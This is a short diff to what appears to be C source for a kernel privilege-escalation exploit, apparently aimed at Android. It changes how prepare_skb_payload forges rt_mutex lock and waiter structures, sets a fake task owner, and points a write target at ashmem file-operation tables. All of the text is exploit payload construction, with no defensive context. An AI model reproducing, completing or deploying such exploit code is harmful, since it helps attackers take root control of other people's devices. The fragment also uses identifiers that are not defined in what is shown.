@@ -780,10 +780,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         uintptr_t lock = payload_base + lock_off;
         uintptr_t waiter = payload_base + waiter_off;
 
-        put32(p, lock_off + 0x00, 0);
-        put64(p, lock_off + 0x08, waiter);
-        put64(p, lock_off + 0x10, waiter);
-        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
+        //fix
+
+        put32(p, LOCK_OFF + 0x00, 0);
+        put64(p, LOCK_OFF + 0x08, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);  // &waiter->pi_tree_entry
+        put64(p, LOCK_OFF + 0x10, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);  // rb_leftmost
+        put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
         put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                         lock, SLIDE_FAKE_WAITER_PRIO);
@@ -863,7 +865,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    //fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = text_addr(ASHMEM_MISC_FOPS);
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
